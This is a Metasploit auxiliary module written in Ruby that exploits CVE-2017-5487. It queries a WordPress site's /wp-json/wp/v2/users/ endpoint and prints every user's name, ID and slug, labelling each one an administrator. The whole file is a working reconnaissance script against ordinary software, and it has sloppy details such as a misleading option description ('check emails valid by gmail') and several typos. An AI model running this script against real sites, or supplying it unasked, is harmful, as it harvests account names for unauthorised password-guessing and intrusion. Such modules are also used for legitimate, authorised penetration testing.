##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'net/http'
require 'json'

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Enumerate administrator wordpress',
      'Description' => %q{
     CVE-2017-5487 - Username Enumeration
	},
      'Author' => [ 'Mateus Lino <dctoralves@protonmail.ch>' ],
      'License' => MSF_LICENSE))

    register_options(
      [
        OptString.new('ENUMERATE_WORDPRESS', [true, 'check emails valid by gmail']),
     ])


  end

  def enumerate_username(targetdom)
    payload = URI("#{targetdom}/wp-json/wp/v2/users/")
    resp = Net::HTTP.get_response(payload)
    parsing = JSON.parse(resp.body)
        
      parsing.each do |enumeracao|
        nome = enumeracao['name']
        slug = enumeracao['slug']
        id = enumeracao['id']

        print_status ("Administrator: #{nome}")
        print_status ("ID: #{id}")
        print_status ("Slug: #{slug}")
      end

 end
  

  def run
  print_status("Enumering administratos wordpress")
  print_status ("\n")
	target = datastore['ENUMERATE_WORDPRESS']
  enumerate_username(target) if datastore['ENUMERATE_WORDPRESS']
   
  end
end
